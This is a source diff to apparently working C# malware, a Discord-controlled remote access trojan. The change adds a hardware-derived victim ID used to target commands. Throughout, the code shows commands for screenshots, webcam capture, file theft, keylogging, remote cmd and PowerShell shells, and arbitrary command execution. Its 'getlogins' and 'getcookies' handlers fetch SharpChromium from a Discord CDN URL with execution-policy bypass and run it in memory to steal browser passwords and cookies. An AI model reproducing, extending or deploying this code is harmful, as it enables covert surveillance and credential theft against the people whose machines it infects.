@@ -26,6 +26,7 @@ namespace payload
     {
         private static DiscordSocketClient client;
         private static string prefix;
+        private static string machineid;
 
         private static List<string> geolock = new List<string>();
 
@@ -54,6 +55,8 @@ namespace payload
 
             Threads tds = new Threads();
             tds.Start();
+
+            machineid = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{Environment.MachineName.Substring(0, 4)}{Environment.UserName.Substring(0, 4)}{Environment.ProcessorCount}_{Utils.GetProcessorId().Substring(0, 5)}{Utils.GetMotherboardSerialNum().Substring(0, 5)}"));
 
             client = new DiscordSocketClient();
             client.MessageReceived += MessageReceived;
@@ -100,12 +103,12 @@ namespace payload
                         }
                         catch { }
 
-                        await message.Channel.SendMessageAsync($"Username: {Environment.UserName}\nMachine name: {Environment.MachineName}\nIP address: {address}\nIP location: {location}");
+                        await message.Channel.SendMessageAsync($"Username: {Environment.UserName}\nMachine name: {Environment.MachineName}\nIP address: {address}\nIP location: {location}\nUnique ID: {machineid}");
                         break;
                     }
                 case "getsc":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         List<FileAttachment> screenshots = new List<FileAttachment>();
                         foreach (Screen screen in Screen.AllScreens)
                         {
@@ -126,7 +129,7 @@ namespace payload
                     }
                 case "getcam":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         List<Bitmap> images = new List<Bitmap>();
                         FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                         foreach (FilterInfo device in devices)
@@ -150,7 +153,7 @@ namespace payload
                     }
                 case "getfile":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         args.RemoveAt(0);
                         string filepath = string.Join(" ", args);
 
@@ -166,7 +169,7 @@ namespace payload
                     }
                 case "getav":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         ManagementObjectSearcher searcher = new ManagementObjectSearcher($"\\\\{Environment.MachineName}\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
                         List<string> instances = searcher.Get().Cast<ManagementObject>().Select(x => (string)x.GetPropertyValue("displayName")).ToList();
                         await message.Channel.SendMessageAsync($"Installed antivirus products:\n```{string.Join("\n", instances)}```");
@@ -175,7 +178,7 @@ namespace payload
                     }
                 case "getlogins":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         string output = Utils.Execute("powershell.exe", "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/967059139203309688/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))");
                         MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(output));
                         await message.Channel.SendFileAsync(ms, "unknown.txt", "SharpChromium output:");
@@ -184,7 +187,7 @@ namespace payload
                     }
                 case "getcookies":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         string output = Utils.Execute("powershell.exe", "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/967059139203309688/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('cookies')))");
                         List<FileAttachment> paths = new List<FileAttachment>();
                         string[] lines = output.Split('\n');
@@ -201,21 +204,21 @@ namespace payload
                     }
                 case "shell":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
                         s.Start("cmd.exe");
                         break;
                     }
                 case "powershell":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
                         s.Start("powershell.exe");
                         break;
                     }
                 case "execute":
                     {
-                        if (args[0] != Environment.MachineName && args[0].ToLower() != "all") break;
+                        if (args[0] != machineid && args[0].ToLower() != "all") break;
                         args.RemoveAt(0);
                         string command = string.Join(" ", args);
                         Utils.Execute("cmd.exe", $"/c {command}");
@@ -224,21 +227,21 @@ namespace payload
                     }
                 case "startkeylogger":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         logkeys = true;
                         await message.Channel.SendMessageAsync($"Keylogger started on {Environment.MachineName}");
                         break;
                     }
                 case "stopkeylogger":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         logkeys = false;
                         await message.Channel.SendMessageAsync($"Keylogger stopped on {Environment.MachineName}");
                         break;
                     }
                 case "getkeylog":
                     {
-                        if (args[0] != Environment.MachineName) break;
+                        if (args[0] != machineid) break;
                         MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(keylog));
                         await message.Channel.SendFileAsync(ms, "unknown.txt");
                         ms.Dispose();
@@ -261,7 +264,7 @@ namespace payload
                     }
                 case "uninfect":
                     {
-                        if (args[0] != Environment.MachineName && args[0].ToLower() != "all") break;
+                        if (args[0] != machineid && args[0].ToLower() != "all") break;
                         await message.Channel.SendMessageAsync($"Attempted to uninfect {Environment.MachineName}");
                         Utils.Uninfect();
                         break;
